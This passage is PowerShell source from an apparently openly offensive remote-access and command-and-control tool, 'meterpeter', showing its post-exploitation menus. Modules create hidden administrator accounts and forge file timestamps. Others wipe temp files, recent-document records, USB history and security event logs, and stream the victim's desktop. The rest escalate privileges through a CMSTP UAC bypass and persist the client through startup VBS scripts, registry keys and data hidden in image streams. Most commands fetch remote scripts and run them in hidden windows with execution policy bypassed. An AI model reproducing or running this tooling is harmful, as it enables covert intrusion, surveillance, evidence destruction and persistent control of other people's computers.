            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Create -UserName $AccountName -Password $password -State $AccountState;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force}Else{echo `"`";echo `"    => error: Administrator privileges required!`"|Out-File `$Env:TMP\hidenUser.meterpeter;Get-Content -Path `$Env:TMP\hidenUser.meterpeter;Remove-Item -Path `$Env:TMP\hidenUser.meterpeter -Force}"
         }
         If($AccManager_choise -ieq "Delete")
         {
            Write-Host " - Input account name: " -NoNewline -ForegroundColor Red;
            $AccountName = Read-Host;Write-Host " * Delete '$AccountName' user account" -ForegroundColor Green
            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Delete -UserName $AccountName;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force}Else{echo `"    => error: Administrator privileges required!`"|Out-File `$Env:TMP\hidenUser.meterpeter;Get-Content -Path `$Env:TMP\hidenUser.meterpeter;Remove-Item -Path `$Env:TMP\hidenUser.meterpeter -Force}"
         }
         If($AccManager_choise -ieq "Return" -or $AccManager_choise -ieq "cls" -or $AccManager_choise -ieq "modules" -or $AccManager_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $AccManager_choise = $Null;
         }
      }
      If($choise -ieq "TimeStamp" -or $choise -ieq "mace")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow
         write-host "   This module modify sellected file mace propertys:"
         write-host "   CreationTime, LastAccessTime and LastWriteTime .." -ForegroundColor DarkYellow
         write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
         write-host "   -------  -----------                  ------------------";
         write-host "   check    existing file timestamp      UserLand";
         write-host "   Modify   existing file timestamp      UserLand";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Mace> " -NoNewline -ForeGroundColor Green;
         $timestamp_choise = Read-Host;
         If($timestamp_choise -ieq "check")
         {
            Write-Host " - File\Folder absolucte path: " -NoNewline
            $FileMace = Read-Host
            If([string]::IsNullOrEmpty($FileMace))
            {
               $FileMace = "`$pwd"
               write-host "   => Error: wrong input, default to $FileMace" -ForegroundColor Red
               Start-Sleep -Milliseconds 700
            }

            Write-Host " * Print $FileMace timestamp(s)" -ForegroundColor Green
            $Command = "If(-not(Test-Path -Path `"$FileMace`" -EA SilentlyContinue)){echo `"`n    NotFound: $FileMace`"}Else{Get-ChildItem -Path `"$FileMace`"|Select-Object @{Name='State';Expression={'Current timestamp'}},Attributes,Name,Directory,CreationTime,LastAccessTime,LastWriteTime}"
         }
         If($timestamp_choise -ieq "Modify")
         {
            Write-Host " - The file to modify absolucte path: " -NoNewline
            $FileMace = Read-Host
            Write-Host " - The Date (08 March 1999 19:19:19): " -NoNewline
            $DateMace = Read-Host
            If(-not($DateMace) -or $DateMace -eq $null)
            {
               $DateMace = "08 March 1999 19:19:19"
               write-host "   => Error: wrong input, default to $DateMace" -ForeGroundColor red                  
            }

            Write-Host " * Modify sellected file timestamp" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/FileMace.ps1`" -OutFile `"`$Env:TMP\FileMace.ps1`"|Out-NUll;powershell -WindowStyle hidden -file `$Env:TMP\FileMace.ps1 -FileMace `"$FileMace`" -Date `"$DateMace`";Start-Sleep -Seconds 4;Remove-Item -Path `"`$Env:TMP\FileMace.ps1`" -Force"
         }
         If($timestamp_choise -ieq "Return" -or $timestamp_choise -ieq "cls" -or $timestamp_choise -ieq "modules" -or $timestamp_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $timestamp_choise = $Null;
         }
      }
      If($choise -ieq "Artifacts")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow
         write-host "   This module deletes attacker activity (artifacts) on target system by"
         write-host "   deleting .tmp, .log, .ps1 from %tmp% and eventvwr logfiles from snapin"
         write-host "   Remark: Administrator privs required to clean eventvwr + Restore Points" -ForegroundColor Yellow
         write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
         write-host "   -------  -----------                  ------------------";
         write-host "   Query    query eventvwr logs          UserLand"
         write-host "   Clean    clean system tracks          UserLand\Administrator";
         write-host "   Paranoid clean tracks paranoid        UserLand\Administrator";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Artifacts> " -NoNewline -ForeGroundColor Green;
         $track_choise = Read-Host;
         If($track_choise -ieq "Query")
         {
            Write-Host " * Query main eventvwr logs" -ForegroundColor Green
            $Command = "Get-WinEvent -ListLog * -ErrorAction Ignore|Where-Object { `$_.LogName -iMatch '(AMSI|UAC|`^Application`$|DeviceGuard/Operational`$|Regsvr32/Operational`$|Windows Defender|WMI-Activity/Operational`$|AppLocker/Exe and DLL`$|AppLocker/MSI and Script`$|`^windows powershell`$|`^Microsoft-Windows-PowerShell/Operational`$|Bits-Client/Operational`$|TCPIP)' -and `$_.LogName -iNotMatch '(/Admin)$'}|Format-Table -AutoSize `> Event.txt;Get-content Event.txt;Remove-Item Event.txt -Force";
         }
         If($track_choise -ieq "clean")
         {
            Write-Host " * Cleanning system tracks`n" -ForegroundColor Green;
            $MeterClient = "$payload_name" + ".ps1" -Join ''
            $Command = "echo `"[*] Cleaning Temporary folder artifacts ..`" `> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:TMP\*`" -Include *.exe,*.bat,*.vbs,*.tmp,*.log,*.ps1,*.dll,*.lnk,*.inf,*.png,*.zip -Exclude *$MeterClient* -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent directory artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:APPDATA\Microsoft\Windows\Recent\*`" -Include *.exe,*.bat,*.vbs,*.log,*.ps1,*.dll,*.inf,*.lnk,*.png,*.txt,*.zip -Exclude desktop.ini -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent documents artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /f|Out-Null;cmd /R REG ADD `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /ve /t REG_SZ /f|Out-Null;echo `"[*] Cleaning DNS Resolver cache artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R ipconfig /flushdns|Out-Null;If(Get-Command `"Clear-RecycleBin`" -EA SilentlyContinue){echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Start-Process -WindowStyle Hidden powershell -ArgumentList `"Clear-RecycleBin -Force`" -Wait}Else{echo `"[x] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => Error: 'Clear-RecycleBin' not found ..`" `>`> `$Env:TMP\clean.meterpeter};echo `"[*] Cleaning ConsoleHost_history artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;`$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath;echo `"MeterPeterNullArtifacts`" `> `$CleanPSLogging;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"[*] Cleaning Cache of plugged USB devices ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /f|Out-Null;cmd /R REG ADD `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /ve /t REG_SZ /f|Out-Null;echo `"[-] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;`$PSlist = wevtutil el | Where-Object {`$_ -iMatch '(AMSI/Debug|UAC|Powershell|BITS|Windows Defender|WMI-Activity/Operational|AppLocker/Exe and DLL|AppLocker/MSI and Script|TCPIP/Operational)' -and `$_ -iNotMatch '(/Admin)`$'};ForEach(`$PSCategorie in `$PSlist){wevtutil cl `"`$PSCategorie`"|Out-Null;echo `"    deleted: `$PSCategorie`" `>`> `$Env:TMP\clean.meterpeter}}Else{echo `"[X] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => error: Administrator privileges required!`" `>`> `$Env:TMP\clean.meterpeter};Get-Content -Path `$Env:TMP\clean.meterpeter;Remove-Item -Path `$Env:TMP\clean.meterpeter -Force"
         }
         If($track_choise -ieq "Paranoid") 
         {
            Write-Host " - Display verbose outputs? (y|n): " -NoNewline
            $StDoutStatus = Read-Host
            If($StDoutStatus -iMatch '^(y|yes|true)$'){$stdout = "True"}Else{$stdout = "False"}
            Write-Host " - Delete Restore Points? (y|n)  : " -NoNewline
            $RPointsStatus = Read-Host;If($RPointsStatus -iMatch '^(y|yes|true)$'){$RStdout = "True"}Else{$RStdout = "False"}
            Write-Host " * Cleanning system tracks." -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1`" -OutFile `"`$Env:TMP\CleanTracks.ps1`"|Out-Null;powershell -exec bypass -File `$Env:TMP\CleanTracks.ps1 -CleanTracks Paranoid -Verb $stdout -DelRestore $RStdout;Remove-Item -Path `$Env:TMP\CleanTracks.ps1 -EA SilentlyContinue -Force"
         }
         If($track_choise -ieq "Return" -or $track_choise -ieq "cls" -or $track_choise -ieq "modules" -or $track_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $track_choise = $Null;
         }
      }
      If($choise -ieq "Stream")
      {
         write-host "`n`n   Requirements:" -ForegroundColor Yellow
         write-host "   Mozilla firefox browser which supports MJPEG installed on attacker."
         write-host "   Streams target desktop live untill 'execution' setting its reached."
         write-host "   Remark: 30 seconds its the minimum accepted execution timer input." -ForegroundColor Yellow
         write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
         write-host "   -------  -----------                  ------------------";
         write-host "   Start    Stream target desktop        UserLand";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Stream> " -NoNewline -ForeGroundColor Green;
         $Stream_choise = Read-Host;
         If($Stream_choise -ieq "Start")
         {

            If(-not(Test-Path -Path "$Env:ProgramFiles\Mozilla Firefox\firefox.exe" -EA SilentlyContinue))
            {
               $Command = $Null;
               Write-Host "`n   abort: Stream target desktop function requires firefox.exe`n          Installed on attacker machine to access the stream." -ForegroundColor Red -BackgroundColor Black
            }
            Else
            {
               $BindPort = "1234"
               write-host " - Input execution time: " -NoNewline
               [int]$ExecTimmer = Read-Host
               If($ExecTimmer -lt 30 -or $ExecTimmer -eq $null)
               {
                  $ExecTimmer = "30"
                  Write-Host "   => Execution to small, defaulting to 30 seconds .." -ForegroundColor Red
                  Start-Sleep -Milliseconds 500
               }
               write-host " - Input target ip addr: " -NoNewline
               $RemoteHost = Read-Host
               Write-Host " * Streaming -[ $RemoteHost ]- Desktop Live!" -ForegroundColor Green
               If(-not($RemoteHost) -or $RemoteHost -eq $null)
               {
                  $RemoteHost = "$Local_Host" #Run stream againts our selft since none ip as inputed!
               }

               #Build output DataTable!
               $StreamTable = New-Object System.Data.DataTable
               $StreamTable.Columns.Add("local_host")|Out-Null
               $StreamTable.Columns.Add("remote_host")|Out-Null
               $StreamTable.Columns.Add("bind_port")|Out-Null
               $StreamTable.Columns.Add("connection")|Out-Null
               $StreamTable.Columns.Add("execution ")|Out-Null

               #Adding values to output DataTable!
               $StreamTable.Rows.Add("$Local_Host","$RemoteHost","$BindPort","Bind","$ExecTimmer seconds")|Out-Null

               #Diplay output DataTable!
               Write-Host "`n";Start-Sleep -Milliseconds 500
               $StreamTable | Format-Table -AutoSize | Out-String -Stream | Select-Object -Skip 1 |
               Select-Object -SkipLast 1 | ForEach-Object {
                  $stringformat = If($_ -Match '^(local_host)'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
                  Write-Host @stringformat $_
               }
               
               <#
               .SYNOPSIS
                  Author: @r00t-3xp10it
                  Helper - Stream Target Desktop (MJPEG)

               .NOTES
                  The next cmdline downloads\imports 'Stream-TargetDesktop.ps1' into %TMP%,
                  Import module, creates trigger.ps1 script to execute 'TargetScreen -Bind'
                  sleeps for sellected amount of time (ExecTimmer), before stoping stream,
                  and deleting all artifacts left behind by this function.
               #>

               #Anwsome Banner
               $AnwsomeBanner = @"
                  '-.
                     '-. _____    
              .-._      |     '.  
             :  ..      |      :  
             '-._'      |    .-'
              /  \     .'i--i
             /    \ .-'_/____\___
                 .-'  :          :Stream_Desktop_Live ..
---------------------------------------------------------------------
"@;Write-Host $AnwsomeBanner
               Write-Host "* Start firefox on: '" -ForegroundColor Red -BackgroundColor Black -NoNewline;
               Write-host "http://${RemoteHost}:${BindPort}" -ForegroundColor Green -BackgroundColor Black -NoNewline;
               Write-host "' to access live stream!" -ForegroundColor Red -BackgroundColor Black;
               $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Stream-TargetDesktop.ps1 -OutFile `$Env:TMP\Stream-TargetDesktop.ps1|Out-Null;echo `"Import-Module -Name `$Env:TMP\Stream-TargetDesktop.ps1 -Force`"|Out-File -FilePath `"`$Env:TMP\trigger.ps1`" -Encoding ascii -Force;Add-Content `$Env:TMP\trigger.ps1 `"TargetScreen -Bind -Port $BindPort`";Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\trigger.ps1`"|Out-Null;Start-Sleep -Seconds $ExecTimmer;`$StreamPid = Get-Content -Path `"`$Env:TMP\mypid.log`" -EA SilentlyContinue|Where-Object { `$_ -ne '' };Stop-Process -id `$StreamPid -EA SilentlyContinue -Force;Remove-Item -Path `$Env:TMP\trigger.ps1 -Force;Remove-Item -Path `$Env:TMP\mypid.log -Force;Remove-Item -Path `$Env:TMP\Stream-TargetDesktop.ps1 -Force";
            }

         }
         If($Stream_choise -ieq "Return" -or $Stream_choise -ieq "cls" -or $Stream_choise -ieq "modules" -or $Stream_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $Delay_Time = $Null;
            $Stream_choise = $Null;
         }
      }
      If($choise -ieq "Escalate")
      {
        write-host "`n`n   Requirements:" -ForegroundColor Yellow
        write-host "   Attacker needs to input the delay time (in seconds) for the client.ps1"
        write-host "   to beacon home after the privilege escalation. Attacker also needs to exit"
        write-host "   meterpeter C2 and start a new listenner to receive the elevated connection."
        write-host "   Remark: This function does not execute _EOP_ if client connection is active." -ForegroundColor Yellow
        write-host "`n`n   Modules     Description                   Privileges Required" -ForegroundColor green
        write-host "   -------     -----------                   ------------------"
        write-host "   getadmin    Escalate client privileges    UserLand"
        write-host "   Delete      Delete getadmin artifacts     UserLand"
        write-host "   CmdLine     Uac execute command elevated  UserLand"
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow
        write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green
        $Escal_choise = Read-Host;
        If($Escal_choise -ieq "GetAdmin")
        {
          write-host " - Input execution delay time  : " -NoNewline
          $DelayTime = Read-Host
          write-host " - Max EOP (client) executions : " -NoNewline
          $ExecRatLoop = Read-Host
          write-host " - Edit client location? (y|n) : " -NoNewline
          $EditRatLocation = Read-Host
          If($EditRatLocation -iMatch '^(y|yes|s)$')
          {
             write-host " - Input client remote location: " -NoNewline
             $RatLocation = Read-Host
             If(-not($RatLocation) -or $RatLocation -eq $null)
             {
                $RatStdOut = "`$Env:TMP\Update-KB5005101.ps1"
                $RatLocation = "False"
             }
             Else
             {
                $RatStdOut = "$RatLocation"            
             }
          }
          Else
          {
             $RatStdOut = "`$Env:TMP\Update-KB5005101.ps1"
             $RatLocation = "False"
          }

          If(-not($DelayTime) -or $DelayTime -lt "30"){$DelayTime = "30"}
          If(-not($ExecRatLoop) -or $ExecRatLoop -lt "1"){$ExecRatLoop = "1"}
          Write-Host " * Elevate session from UserLand to Administrator!" -ForegroundColor Green
          Write-Host "   => Downloading: UACBypassCMSTP from GitHub into %TMP% ..`n" -ForeGroundColor Blue
          Start-Sleep -Seconds 1

          #Build output DataTable!
          $mytable = New-Object System.Data.DataTable
          $mytable.Columns.Add("max_executions")|Out-Null
          $mytable.Columns.Add("execution_delay")|Out-Null
          $mytable.Columns.Add("rat_remote_location")|Out-Null

          #Adding values to DataTable!
          $mytable.Rows.Add("$ExecRatLoop",        ## max eop executions
                            "$DelayTime seconds",  ## Looop each <int> seconds
                            "$RatStdOut"           ## rat client absoluct path
          )|Out-Null

          #Diplay output DataTable!
          $mytable | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1 | ForEach-Object {
             $stringformat = If($_ -Match '^(max_executions)'){
                @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
             Write-Host @stringformat $_
          }

          #Anwsome Banner
          $AnwsomeBanner = @"
                             ____
                     __,-~~/~    `---.
                   _/_,---(      ,    )
               __ /        <    /   )  \___
- ------===;;;'====------------------===;;;===--------  -
                  \/  ~"~"~"~"~"~\~"~)~"/
                  (_ (   \  (     >    \)
                   \_( _ <         >_>'
                      ~ `-i' ::>|--"
                          I;|.|.|
                         <|i::|i|`.
                        (` ^'"`-' ") CMSTP EOP
--------------------------------------------------------------------------
"@;Write-Host $AnwsomeBanner
          Write-Host "* Exit *Meterpeter* and start a new Handler to recive the elevated shell.." -ForegroundColor Red -BackgroundColor Black
          Write-Host "  => _EOP_ shell settings: lhost:" -ForegroundColor Red -BackgroundColor Black -NoNewline;
          Write-Host "$Local_Host" -ForegroundColor Green -BackgroundColor Black -NoNewline;
          Write-Host " lport:" -ForegroundColor Red -BackgroundColor Black -NoNewline;
          Write-Host "$Local_Port" -ForegroundColor Green -BackgroundColor Black -NoNewline;
          Write-Host " obfuscation:bxor" -ForegroundColor Red -BackgroundColor Black;

          #Execute Command Remote
          Start-Sleep -Seconds 1;$TriggerSettings = "$Local_Host"+":"+"$Local_Port" -join ''
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"`n[x] Error: Abort, session allready running under Administrator token ..`" `> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force;}Else{echo `"$TriggerSettings`" `> `$Env:TMP\EOPsettings.log;iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CMSTPTrigger.ps1 -OutFile `$Env:TMP\CMSTPTrigger.ps1|Out-Null;Start-Process -WindowStyle hidden powershell.exe -ArgumentList `"-File `$Env:TMP\CMSTPTrigger.ps1 -DelayTime $DelayTime -LoopFor $ExecRatLoop -RatLocation $RatLocation`"}"
        }
        If($Escal_choise -ieq "Delete" -or $Escal_choise -ieq "del")
        {
          Write-Host " Delete privilege escalation artifacts left behind." -ForegroundColor Green -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "Stop-Process -Name cmstp -EA SilentlyContinue;Remove-Item -Path `"`$Env:TMP\*`" -Include *.log,*.ps1,*.dll,*.inf,*.bat,*.vbs -Exclude *Update-* -EA SilentlyContinue -Force|Select -SkipLast 1;echo `"   [i] meterpeter EOP artifacts successfuly deleted.`" `> logme.log;Get-Content logme.log;Remove-Item -Path logme.log";
        }
        If($Escal_choise -ieq "CmdLine")
        {
           Write-Host " * Spawn UAC gui to run cmdline elevated." -ForegroundColor Green
           write-host " - Input cmdline to run elevated: " -NoNewline
           $ElevatedCmdLine = Read-Host

           $Command = "powershell -C `"Start-Process $Env:WINDIR\system32\cmd.exe -ArgumentList '$ElevatedCmdLine' -verb RunAs`";echo `"`n[i] Executing: '$ElevatedCmdLine'`" `> `$Env:TMP\sdhsdc.log;Get-Content `$Env:TMP\sdhsdc.log;Remove-Item -Path `"`$Env:TMP\sdhsdc.log`" -Force"
        }
        If($Escal_choise -ieq "Return" -or $Escal_choise -ieq "cls" -or $Escal_choise -ieq "modules" -or $Escal_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Delay_Time = $Null;
          $Escal_choise = $Null;
          $trigger_File = $Null;
        }
      }
      If($choise -ieq "Persist" -or $choise -ieq "persistance")
      {
        write-host "`n`n   Requirements:" -ForegroundColor Yellow;
        write-host "   Client (payload) must be deployed in target %TEMP% folder.";
        write-host "   Meterpeter C2 must be put in listener mode (using same lhost|lport), and";
        write-host "   Target machine needs to restart (startup) to beacon home at sellected time." -ForegroundColor Yellow;
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     ------------------";
        write-host "   Beacon    Persiste Client using startup   UserLand";
        write-host "   ADSRUN    Persiste Client using ADS:Run   UserLand";
        write-host "   RUNONCE   Persiste Client using REG:Run   UserLand";
        write-host "   REGRUN    Persiste Client using REG:Run   UserLand|Administrator";
        write-host "   Schtasks  Persiste Client using Schtasks  Administrator";
        write-host "   WinLogon  Persiste Client using WinLogon  Administrator";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Persistance> " -NoNewline -ForeGroundColor Green;
        $startup_choise = Read-Host;
        If($startup_choise -ieq "Beacon")
        {
          $dat = Get-Date;
          $BeaconTime = $Null;
          $logfile = "$IPATH"+"beacon.log";

          Write-host " - Input Time (sec) to beacon home (eg: 60): " -NoNewline;
          $Delay_Time = Read-Host;
          If(-not($Delay_Time) -or $Delay_Time -lt "30"){$Delay_Time = "60"}

          Write-host " - Use target OUTLOOK to send me msg (y|n) : " -NoNewline;
          $mSGmE = Read-Host;
          If($mSGmE -iMatch '^(y|yes)$')
          {
             Write-host " - Input Email Address to where send msg   : " -NoNewline;
             $OutLokAddr = Read-Host;
          }

          $BeaconTime = "$Delay_Time"+"000";
          write-host " * Execute client ($payload_name.ps1) with $Delay_Time (sec) loop." -ForegroundColor Green
          Start-Sleep -Seconds 1
          Write-Host "`n`n   Scripts               Remote Path" -ForeGroundColor green;
          Write-Host "   -------               -----------";
          Write-Host "   $payload_name.ps1  `$Env:TMP\$payload_name.ps1";
          Write-Host "   $payload_name.vbs  `$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs" -ForegroundColor Green;
          Write-Host "   Persistence LogFile:  $logfile" -ForeGroundColor yellow;
          Write-Host "   [i] On StartUp our client should beacon home from $Delay_Time to $Delay_Time seconds.`n" -ForeGroundColor DarkGray;

          If($mSGmE -iMatch '^(y|yes)$')
          {
             #Use Local OUTLOOK to send a message to attacker evertime the persistence.vbs its executed at startup ...
             $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"powershell.exe -Win 1 cd `$Env:TMP;powershell.exe -Win 1 iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1 -OutFile ReadEmails.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"powershell.exe -Win 1 cd `$Env:TMP;powershell.exe -Win 1 -File ReadEmails.ps1 -action Send -SendTo $OutLokAddr -SendSubject Meterpeter_C2_v2.10.11 -SendBody Meterpeter_C2_Have_beacon_home`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
          }
          Else
          {
             $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";                            
          }

          ## Writing persistence setting into beacon.log local file ..
          echo "" >> $logfile
          echo "Persistence Settings" >> $logfile;
          echo "--------------------" >> $logfile;
          echo "DATE    : $dat" >> $logfile;
          echo "RHOST   : $Remote_Host" >> $logfile;
          echo "LHOST   : $Local_Host" >> $logfile;
          echo "LPORT   : $Local_Port" >> $logfile;
          If($mSGmE -iMatch '^(y|yes)$')
          {
             echo "OUTLOOK : $OutLokAddr" >> $logfile;
          }
          echo "" >> $logfile;
        }
        If($startup_choise -ieq "ADSRUN" -or $startup_choise -ieq "ADS")
        {
           Write-Host "`n`n   Description:" -ForegroundColor Yellow
           Write-Host "   This module ask users to input the client.ps1 and one image.png absoluct"
           Write-Host "   paths then the client.ps1 will be embbebed on image.png (ADS_`$DATA) and"
           Write-Host "   a registry key (HKCU) is created to run image.png `$DATA on every startup."
           Write-Host "   Remark: This module only accepts [.bat|.txt|.ps1|.exe] payload file formats." -ForegroundColor Yellow
           Write-Host "   Remark: This module can be used to execute other scripts beside client.ps1`n" -ForegroundColor Yellow
           Write-host " - Execute ADS:run module? (create|find|Clean)    : " -ForeGroundColor DarkGray -NoNewline;
           $Chosen_Option = Read-Host;

           If($Chosen_Option -iMatch '^(create)$')
           {
              Write-host " - Input 'Update-KB5005101.ps1' absoluct path     : " -NoNewline;
              $Client_name = Read-Host;
              Write-host " - Input image(.png|.jpg|.jpeg) absoluct path     : " -NoNewline;
              $Image_name = Read-Host;

              If($Client_name -iMatch '\\' -and $Image_name -iMatch '\\')
              {
                 $RawImagePath = $Image_name.Split('\\')[-1]               # blitzo.png
                 $RawPayloadPath = $Client_name.Split('\\')[-1]            # Update-KB5005101.ps1
                 $LegitImage = $Image_name -replace "\\${RawImagePath}","" # C:\Users\pedro\Coding\ADS_TUTORIAL

                 Write-Host " * Embebbed '$RawPayloadPath' on '$RawImagePath' (ADS)" -ForegroundColor Green
                 Write-Host "   => '$RawImagePath' `$DATA will be executed at startup." -ForegroundColor Yellow
                 Start-Sleep -Seconds 1

                 ## Current Settings
                 # RawImagePath   :  blitzo.png
                 # RawPayloadPath :  Update-KB5005101.ps1
                 # LegitImage     :  C:\Users\pedro\Coding\ADS_TUTORIAL
                 # Image_name     :  C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png
                 # Client_name    :  C:\Users\pedro\AppData\Local\Temp\Update-KB5005101.ps1
                 ## ORIGINAL: $Command = "echo `"@echo off`"|Out-File `"${LegitImage}\ZoneIdentifier.bat`" -Encoding default -Force;Add-Content ${LegitImage}\ZoneIdentifier.bat `"powershell -WindowStyle hidden -File $Client_name`" -Force;iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AdsMasquerade.ps1`" -OutFile `"`$Env:TMP\AdsMasquerade.ps1`"|Unblock-File;powershell -file `$Env:TMP\AdsMasquerade.ps1 -ADS `"create`" -streamdata `"${LegitImage}\ZoneIdentifier.bat`" -intextfile `"$Image_name`" -registry `"true`";Remove-Item -Path `"`$Env:TMP\AdsMasquerade.ps1`" -Force";

                 #BugReport: @Daniel_Durnea
                 $Command = "echo `"@echo off`"|Out-File `"${LegitImage}\ZoneIdentifier.bat`" -Encoding default -Force;Add-Content ${LegitImage}\ZoneIdentifier.bat `"powershell -C Start-Process -WindowStyle hidden powershell -ArgumentList '-File REPL4CEM3'`" -Force;((Get-Content -Path ${LegitImage}\ZoneIdentifier.bat -Raw) -Replace `"REPL4CEM3`",`"$Client_name`")|Set-Content -Path ${LegitImage}\ZoneIdentifier.bat -Force;iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AdsMasquerade.ps1`" -OutFile `"`$Env:TMP\AdsMasquerade.ps1`"|Unblock-File;powershell -file `$Env:TMP\AdsMasquerade.ps1 -ADS `"create`" -streamdata `"${LegitImage}\ZoneIdentifier.bat`" -intextfile `"$Image_name`" -registry `"true`";Remove-Item -Path `"`$Env:TMP\AdsMasquerade.ps1`" -Force";
              }
              Else
